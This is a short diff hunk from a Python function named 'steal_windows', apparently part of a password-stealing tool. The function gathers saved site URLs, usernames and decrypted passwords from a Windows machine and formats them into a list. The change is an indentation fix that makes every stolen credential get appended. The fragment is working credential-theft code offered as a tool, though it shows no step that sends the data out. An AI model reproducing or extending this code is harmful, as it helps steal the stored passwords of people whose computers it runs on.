@@ -44,8 +44,8 @@ def steal_windows():
 				# If the URL is blank,print it as (Unknown)
 				if(len(result[0]) <= 0):
 					result[0] = "(Unknown)"
-					# Print the result
-					ret.append ("[+] URL:{url}\n    Username:{user}\n    Password:{pass_}\n".format(url=result[0],user=result[1],pass_=password))
+				# Print the result
+				ret.append ("[+] URL:{url}\n    Username:{user}\n    Password:{pass_}\n".format(url=result[0],user=result[1],pass_=password))
 		return ret
 	else:
 		return ('[-] There are no passwords')
